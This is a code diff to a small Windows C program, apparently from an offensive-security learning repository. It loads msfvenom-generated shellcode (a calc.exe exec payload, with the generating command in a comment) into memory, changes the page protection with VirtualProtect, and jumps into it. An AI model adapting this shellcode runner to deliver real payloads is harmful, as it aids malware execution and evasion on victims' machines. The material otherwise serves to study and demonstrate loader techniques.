@@ -1,9 +1,10 @@
 #include <windows.h>
 #include <stdio.h>
+#include "../utils/utility.h"
 
 int main(int argc, char const *argv[])
 {
-    DWORD pid;
+    DWORD oldProtection;
 // msfvenom -p windows/x64/exec CMD="cmd.exe /C calc.exe" EXITFUNC=thread
 // --platform windows -a x64 -b "\x00\x0a\x0d" -f c -v exec
     unsigned char exec[] = 
@@ -35,10 +36,16 @@ int main(int argc, char const *argv[])
 
     size_t execSize = sizeof(exec);
 
-    void *func = VirtualAlloc(0, execSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    void *func = VirtualAlloc(0, execSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     memcpy(func, exec, execSize);
+    if (VirtualProtect(func, execSize, PAGE_EXECUTE_READWRITE, &oldProtection) == 0){
+        MESSAGE(FAIL, "Impossible to change the protection of the allocated space in the current process\n");
+        PRINT_ERROR(VirtualProtect);
+        return EXIT_FAILURE;
+    }
+    MESSAGE(INFO, "Shellcode address: 0x%p\n", func);
+    getchar();
     ((void(*)())func)();
-
 
     return EXIT_SUCCESS;
 }
